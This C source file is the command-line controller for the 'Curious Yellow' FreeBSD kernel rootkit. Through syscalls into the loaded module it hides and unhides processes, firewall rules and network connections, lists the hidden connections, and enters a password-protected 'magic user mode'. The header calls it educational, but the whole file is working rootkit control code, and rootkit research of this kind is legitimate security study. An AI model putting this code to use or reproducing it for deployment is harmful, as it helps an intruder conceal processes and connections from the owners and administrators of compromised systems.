/*
 * Copyright (c) 2001, Stephanie Wehner <atrak@itsx.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The names of its contributors may be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 *    Tool to control curious yellow. Written for educational purposes only.
 *
 *    $Id: cyctl.c,v 1.1.1.1 2001/08/06 12:02:06 atrak Exp $
 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/module.h>

#include "../config.h"
#include "../module/control.h"

#define C(x)    ((u_int)((x) & 0xff))


void usage(void);
void error(int, char *);
void get_connection(struct connection *);
void view_connections(int);

int main(int argc, char **argv)
{
    int retval,opt;
    struct module_stat stat;
    int module_num;
    pid_t pid;
    u_short numrule;
    struct connection conn;
    char magic[21];
    char *p;

    printf("Welcome to Curious Yellow\n\n");

    /* first of all find the syscalls */
    stat.version = sizeof(stat);

    if(modstat(modfind("cy"), &stat) != 0) {

        /* unable to locate module, take first argument */
        if(!argv[1]) {
            usage();
            exit(-1);
        }
        module_num = atoi(argv[1]);
        optind = 2;

    } else {
        module_num = stat.data.intval; 
    }

    /* find out what needs to be done */

    while ((opt = getopt(argc, argv, "h:u:o:c:elNUV")) != EOF) {

        switch(opt) {

            case 'h':
                /* hide the given process */
                pid = atoi(optarg);
	        retval = syscall(module_num,MOD_PROC_HIDE,&pid);
	        if(retval != 0) {
	            fprintf(stderr,"Unable to hide process: %s\n",strerror(errno));
	            exit(-1);
	        }
	        break;

            case 'u':
                /* unhide the given process */
                pid = atoi(optarg);
	        retval = syscall(module_num,MOD_PROC_UNHIDE,&pid);
	        if(retval != 0) {
	            fprintf(stderr,"Unable to unhide process: %s\n",strerror(errno));
	            exit(-1);
	        }
	        break;

	    case 'o':
		/* hide the given firewall rule */
		numrule = atoi(optarg);
		retval = syscall(module_num,MOD_HIDE_FW,&numrule);
		if(retval != 0) {
			fprintf(stderr,"Unable to hide firewall rule: %s\n",strerror(errno));
			exit(-1);
		}
		break;

	    case 'c':
		/* unhide the given firewall rule */
		numrule = atoi(optarg);
		retval = syscall(module_num,MOD_UNHIDE_FW,&numrule);
		if(retval != 0) {
		    fprintf(stderr,"Unable to unhide firewall rule: %s\n",strerror(errno));
		    exit(-1);
		}
		
		break;
			
	    case 'e':
	        /* get the magic word */
	        printf("Magic word: ");

	        if(fgets(magic, 20, stdin) == NULL) {
	            perror("Unable to read input");
	            exit(-1);
	        }

	        if((p = strchr(magic, '\n')) != NULL)
	            *p = '\0';

                retval = syscall(module_num,MOD_ENTER,magic);
	        if(retval != 0) {
	            fprintf(stderr,"Unable to enter magic mode: %s\n",strerror(errno));
	            exit(-1);
	        }

                break;

            case 'l':
                /* leave magic user mode */
	        retval = syscall(module_num,MOD_LEAVE,NULL);
	        if(retval != 0) {
	            fprintf(stderr,"Unable to leave magic mode: %s\n",strerror(errno));
	            exit(-1);
	        }

	        break;
		
            case 'N':
                /* hide a network connection */
                get_connection(&conn);

	        retval = syscall(module_num, MOD_NET_HIDE, &conn);
	        if(retval != 0) {
	            fprintf(stderr,"Unable to hide new network connection: %s\n",strerror(errno));
	            exit(-1);
	        }

	        break;

            case 'U':
                /* unhide a network connection */
                get_connection(&conn);

	        retval = syscall(module_num, MOD_NET_UNHIDE, &conn);
	        if(retval != 0) {
	            fprintf(stderr,"Unable to hide new network connection: %s\n",strerror(errno));
	            exit(-1);
	        }

                break;

            case 'V':
                /* view configured list of hidden connections */
                view_connections(module_num);

                break;

            default:
                usage();
	        exit(-1);

        } /* switch */

    } /* while */

    if(optind == 1) {
        usage();
        exit(-1);
    }

}

void
usage()
{
	fprintf(stderr,"\nUsage: feather [options]\n\n");
	fprintf(stderr,"-h [pid]	hide process with the given pid\n");
	fprintf(stderr,"-u [pid]	unhide process with the given pid\n");
        fprintf(stderr,"-o [num]        hide the firewall rule with the given number\n");
        fprintf(stderr,"-c [num]        unhide the rule\n");
        fprintf(stderr,"-N              hide network connection\n");
        fprintf(stderr,"-U              unhide network connection\n");
        fprintf(stderr,"-V              view configured hidden connections\n");
	fprintf(stderr,"-e 		enter magic user mode\n");
	fprintf(stderr,"-l 		leave magic user mode\n");
}

void
get_connection(struct connection *conn)
{
    char *p;
    char address[17], port[7];

    /* enter network connection to hide */
    printf("Foreign address: ");

    if(fgets(address, 16, stdin) == NULL) {
        perror("Unable to read input");
        exit(-1);
    }

    if((p = strchr(address, '\n')) != NULL)
        *p = '\0';

    conn->r_ip = inet_addr(address);

    printf("Foreign port: ");

    if(fgets(port,6,stdin) == NULL) {
        perror("Unable to read input");
        exit(-1);
    }

    if((p = strchr(port, '\n')) != NULL)
        *p = '\0';

    conn->r_port = ntohs(atoi(port));

    printf("Local address: ");

    if(fgets(address, 16, stdin) == NULL) {
        perror("Unable to read input");
        exit(-1);
    }

    if((p = strchr(address, '\n')) != NULL)
        *p = '\0';

    conn->l_ip = inet_addr(address);

    printf("Local port: ");

    if(fgets(port,6,stdin) == NULL) {
        perror("Unable to read input");
        exit(-1);
    }

    if((p = strchr(port, '\n')) != NULL)
        *p = '\0';

    conn->l_port = ntohs(atoi(port));

    return;
}


void
view_connections(int module_num)
{
    struct connection *conn = (struct connection *)malloc(MAX_NET * sizeof(struct connection));
    int i, retval;

    retval = syscall(module_num, MOD_NET_VIEW, conn);
    if(retval != 0) {
        fprintf(stderr,"Unable to view hidden connections: %s\n",strerror(errno));
        exit(-1);
    }

    printf("Local address\t\tForeign Address\n");

    for(i = 0;i < MAX_NET;i++) {

        if((conn[i].l_ip != 0) || (conn[i].l_port != 0) ||
           (conn[i].r_ip != 0) || (conn[i].r_port != 0)) {
            printf("%u.%u.%u.%u.%u\t\t%u.%u.%u.%u.%u\n",C(conn[i].l_ip), C(conn[i].l_ip >> 8), 
                                C(conn[i].l_ip >> 16), C(conn[i].l_ip >> 24), ntohs(conn[i].l_port),
                                C(conn[i].r_ip), C(conn[i].r_ip >> 8),
                                C(conn[i].r_ip >> 16), C(conn[i].r_ip >> 24),ntohs(conn[i].r_port));
            }

    }

    free(conn);

}

